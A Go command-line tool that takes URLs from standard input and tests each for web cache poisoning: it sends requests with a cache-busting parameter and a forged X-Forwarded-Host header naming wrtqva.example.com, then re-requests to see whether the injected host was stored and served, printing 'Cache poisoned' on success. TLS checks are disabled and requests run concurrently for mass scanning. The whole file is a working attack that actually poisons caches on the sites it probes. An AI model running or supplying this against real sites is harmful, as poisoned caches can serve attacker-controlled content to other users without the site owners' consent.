package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

func main() {
	client := newClient()

	var wg sync.WaitGroup

	sc := bufio.NewScanner(os.Stdin)

	for sc.Scan() {

		rawURL := sc.Text()
		wg.Add(1)

		time.Sleep(100000000)

		go func() {
			defer wg.Done()

			// create the request
			var b io.Reader

			_, err := url.ParseRequestURI(rawURL)
			if err != nil {
				return
			}

			req, err := http.NewRequest("GET", rawURL, b)
			if err != nil {
				fmt.Fprintf(os.Stderr, "failed to create request: %s\n", err)
				return
			}

			q := req.URL.Query()
			q.Add("wrtqva1", "wrtqva")
			req.URL.RawQuery = q.Encode()

			req.Header.Set("X-Forwarded-Host", "wrtqva.example.com")

			// send the request
			resp, err := client.Do(req)
			if err != nil {
				fmt.Fprintf(os.Stderr, "request failed: %s\n", err)
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				bodyBytes, err := ioutil.ReadAll(resp.Body)

				if err != nil {
					fmt.Fprintf(os.Stderr, "read response failed: %s\n", err)
					return
				}
				bodyString := string(bodyBytes)

				if strings.Contains(bodyString, "wrtqva.example.com") {
					poisonReq, err := http.NewRequest("GET", rawURL, b)

					if err != nil {
						fmt.Fprintf(os.Stderr, "failed to create request: %s\n", err)
						return
					}

					pq := poisonReq.URL.Query()
					pq.Add("wrtqva1", "wrtqva")
					poisonReq.URL.RawQuery = pq.Encode()

					poisonResp, err := client.Do(poisonReq)
					poisonBodyBytes, err := ioutil.ReadAll(poisonResp.Body)
					poisonBodyString := string(poisonBodyBytes)

					if err != nil {
						fmt.Fprintf(os.Stderr, "request failed: %s\n", err)
						return
					}
					defer poisonResp.Body.Close()

					if strings.Contains(poisonBodyString, "wrtqva.example.com") {
						fmt.Fprintf(os.Stdout, "Cache poisoned: %s\n", rawURL)
					}
				}
			}
		}()
	}

	wg.Wait()

}

func newClient() *http.Client {

	tr := &http.Transport{
		MaxIdleConns:      30,
		IdleConnTimeout:   time.Second,
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Second * 10,
			KeepAlive: time.Second,
		}).DialContext,
	}

	re := func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	return &http.Client{
		Transport:     tr,
		CheckRedirect: re,
		Timeout:       time.Second * 10,
	}

}
